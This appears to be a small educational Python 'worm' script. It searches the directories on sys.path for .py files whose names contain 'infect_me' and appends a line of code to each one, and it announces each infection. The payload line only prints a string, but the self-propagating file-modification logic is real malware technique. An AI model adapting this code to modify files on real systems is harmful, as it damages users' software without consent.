"""worm.py
    Lukas Elsrode - (10/06/2021)
"""

import os
import sys

# Thing I want to splice into other code
DEFAULT_VIRUS_SIGNATURE = "print('UGLY_DUCKLINGS_GO_QUACK!')"


# Our Target Files on the Machine
DEFAULT_PATHS = sys.path
DEFAULT_FSIGNATURE = 'infect_me'
DEFAULT_FILE_TYPE = '.py'


# find all the Files of choosing on given System
def seek_files(paths=DEFAULT_PATHS, file_signature=DEFAULT_FSIGNATURE, ftype=DEFAULT_FILE_TYPE):
    target_files = []
    # Get all the files from valid directories
    for p in paths:
        if os.path.isdir(p):
            filenames = os.listdir(p)
            for f in filenames:
                if os.path.isdir(p + "/" + f) and p != '/':
                    target_files.extend(seek_files(p + "/" + f))
                elif file_signature in f and f[-3:] == ftype:
                    target_files.append(p + "/" + f)
    return list(set(target_files))

# infect the given files
def infect_files(files_to_infect):
    virus_string = DEFAULT_VIRUS_SIGNATURE
    # Copy file contents and attach worm to end of file
    for filename in files_to_infect:
        f = open(filename)
        temp = f.read()
        f.close()
        f = open(filename, "w")
        f.write(temp + "\n" + virus_string)
        print(filename[len(os.path.abspath("")) + 1:] + " infected.")
        f.close()


# infect all the python files in the machine matching our signature
def infect_local():
    files_to_infect = seek_files()
    infect_files(files_to_infect)
    print('*** Local Directory is Infected ***')


if __name__ == "__main__":
    infect_local()
